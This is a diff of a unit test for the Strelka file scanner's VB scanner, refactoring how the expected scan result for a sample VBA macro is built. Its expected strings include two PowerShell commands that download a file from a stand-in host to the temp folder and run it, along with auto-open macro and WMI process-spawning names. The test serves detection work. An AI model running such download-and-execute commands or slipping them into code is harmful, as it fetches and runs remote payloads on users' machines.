@@ -1,90 +1,94 @@
-from pathlib import Path
-from unittest import TestCase, mock
+from strelka.tests import (
+    File,
+    Scanner,
+    fixtures,
+    make_event,
+    make_indicator,
+    run_test_scan,
+)
 
-from pytest_unordered import unordered
 
-from strelka.scanners.scan_vb import ScanVb as ScanUnderTest
-from strelka.tests import run_test_scan
+scan_vb = fixtures.scanners.vb
+data_vba = fixtures.data("test.vba")
 
 
-def test_scan_vb(mocker):
+def test_scan_vb(
+    scan_vb: Scanner,
+    data_vba: File,
+) -> None:
     """
-    Pass: Sample event matches output of scanner.
-    Failure: Unable to load file or sample event fails to match.
+    Pass:   Sample event matches output of scanner.
+    Fail:   Sample event fails to match.
     """
-    test_scan_event = {
-        "elapsed": mock.ANY,
-        "flags": [],
-        "comments": ["AutoOpen Macro"],
-        "functions": ["AutoOpen", "Document_Open", "Testing_Iocs"],
-        "names": [
-            "Explicit",
-            "MsgBox",
-            "objWMIService",
-            "GetObject",
-            "objStartup",
-            "Get",
-            "objConfig",
-            "SpawnInstance_",
-            "ShowWindow",
-            "objProcess",
-            "ExecuteCmdAsync",
+    test_event = make_event(
+        related=[
+            make_indicator("domain-name", "www.test.com"),
+            make_indicator("domain-name", "www.test.example.com"),
+            make_indicator("url", "https://www.test.com/test.bat"),
+            make_indicator("url", "https://www.test.example.com"),
         ],
-        "operators": ["="],
-        "strings": [
-            "Hello World!",
-            "winmgmts:\\\\\\\\.\\\\root\\\\cimv2",
-            "Win32_ProcessStartup",
-            "winmgmts:\\\\\\\\.\\\\root\\\\cimv2:Win32_Process",
-            "cmd /c powershell Invoke-WebRequest -Uri https://www.test.example.com -OutFile $env:tmp\\\\test.txt\\nStart-Process -Filepath $env:tmp\\\\invoice.one",
-            "cmd /c powershell Invoke-WebRequest -Uri https://www.test.com/test.bat -OutFile $env:tmp\\\\test.bat\\nStart-Process -Filepath $env:tmp\\\\test.bat",
-        ],
-        "script_length_bytes": 752,
-        "tokens": [
-            "Token.Keyword",
-            "Token.Name",
-            "Token.Text.Whitespace",
-            "Token.Name.Function",
-            "Token.Punctuation",
-            "Token.Comment",
-            "Token.Literal.String",
-            "Token.Operator",
-            "Token.Literal.Number.Integer",
-        ],
-        "urls": unordered(
-            [
-                "tmp\\\\invoice.one",
-                "https://www.test.com/test.bat",
-                "https://www.test.example.com",
-            ]
-        ),
-        "iocs": unordered(
-            [
-                {
-                    "ioc": "www.test.example.com",
-                    "ioc_type": "domain",
-                    "scanner": "ScanVb",
-                },
-                {
-                    "ioc": "https://www.test.example.com",
-                    "ioc_type": "url",
-                    "scanner": "ScanVb",
-                },
-                {"ioc": "www.test.com", "ioc_type": "domain", "scanner": "ScanVb"},
-                {
-                    "ioc": "https://www.test.com/test.bat",
-                    "ioc_type": "url",
-                    "scanner": "ScanVb",
-                },
-            ]
-        ),
-    }
-
-    scanner_event = run_test_scan(
-        mocker=mocker,
-        scan_class=ScanUnderTest,
-        fixture_path=Path(__file__).parent / "fixtures/test.vba",
+        scan={
+            "script_length_bytes": 752,
+            "token_types": [
+                "Strelka.Url",
+                "Token.Comment",
+                "Token.Keyword",
+                "Token.Literal.Number.Integer",
+                "Token.Literal.String",
+                "Token.Name",
+                "Token.Name.Function",
+                "Token.Operator",
+                "Token.Punctuation",
+                "Token.Text.Whitespace",
+            ],
+            "tokens": {
+                "comments": [
+                    r"AutoOpen Macro",
+                ],
+                "functions": [
+                    r"AutoOpen",
+                    r"Document_Open",
+                    r"Testing_Iocs",
+                ],
+                "names": [
+                    r"Explicit",
+                    r"MsgBox",
+                    r"objWMIService",
+                    r"GetObject",
+                    r"objStartup",
+                    r"Get",
+                    r"objConfig",
+                    r"SpawnInstance_",
+                    r"ShowWindow",
+                    r"objProcess",
+                    r"ExecuteCmdAsync",
+                ],
+                "operators": ["="],
+                "strings": [
+                    r"Hello World!",
+                    r"winmgmts:\\\\.\\root\\cimv2",
+                    r"Win32_ProcessStartup",
+                    r"winmgmts:\\\\.\\root\\cimv2:Win32_Process",
+                    (
+                        r"cmd /c powershell Invoke-WebRequest -Uri https://www.test.exa"
+                        r"mple.com -OutFile $env:tmp\\test.txt\nStart-Process -Filepath"
+                        r" $env:tmp\\invoice.one"
+                    ),
+                    (
+                        r"cmd /c powershell Invoke-WebRequest -Uri https://www.test.com"
+                        r"/test.bat -OutFile $env:tmp\\test.bat\nStart-Process -Filepat"
+                        r"h $env:tmp\\test.bat"
+                    ),
+                ],
+                "urls": [
+                    r"https://www.test.example.com",
+                    r"https://www.test.com/test.bat",
+                ],
+            },
+        },
     )
-
-    TestCase.maxDiff = None
-    TestCase().assertDictEqual(test_scan_event, scanner_event)
+    run_test_scan(
+        scanner=scan_vb,
+        fixture=data_vba,
+        expected=test_event,
+    )
